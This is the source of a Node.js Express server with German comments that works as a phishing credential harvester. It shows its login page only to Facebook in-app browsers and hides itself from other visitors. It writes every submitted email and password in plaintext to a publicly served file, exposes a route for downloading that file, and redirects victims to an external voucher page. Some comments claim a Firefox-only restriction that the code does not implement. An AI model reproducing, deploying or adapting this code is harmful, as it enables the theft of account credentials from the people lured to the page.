const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const DATA_FILE = path.join(__dirname, "public", "users.txt");


//1. Nur Facebook In-App WebView erlauben
app.get("", (req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
    return res.status(404).send("");
  }
  next();
});

app.get("/login", (req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
    return res.status(404).send("");
  }
  next();
});

// 2. Sicherstellen, dass users.txt existiert
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, "", "utf8");
}

// 3. Body-Parsing und static-Folder
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

// 4. Login-Route: schreibt E-Mail und Passwort in users.txt
app.post("/login", (req, res) => {
  // const ua = req.headers["user-agent"] || "";
  // if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
  //   return res.status(404).send("");
  // }

  const { login_email, login_password } = req.body;
  const line = `${new Date().toISOString()} | ${login_email} | ${login_password}\n`;

  fs.appendFile(DATA_FILE, line, "utf8", (err) => {
    if (err) {
      console.error("Fehler beim Schreiben:", err);
      return res.status(500).send("Serverfehler");
    }
    res.redirect("https://webly-gutschein.weebly.com/end.html");
  });
});

// 5. Route zum Ausliefern der Datei (nur Firefox-Nutzer)
app.get("/show-users", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "users.txt"), (err) => {
    if (err) {
      console.error("Fehler beim Lesen der Datei:", err);
      res.status(500).send("Konnte Datei nicht laden");
    }
  });
});

// 6. Server starten
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server läuft auf Port ${PORT} – nur Firefox erlaubt.`);
});
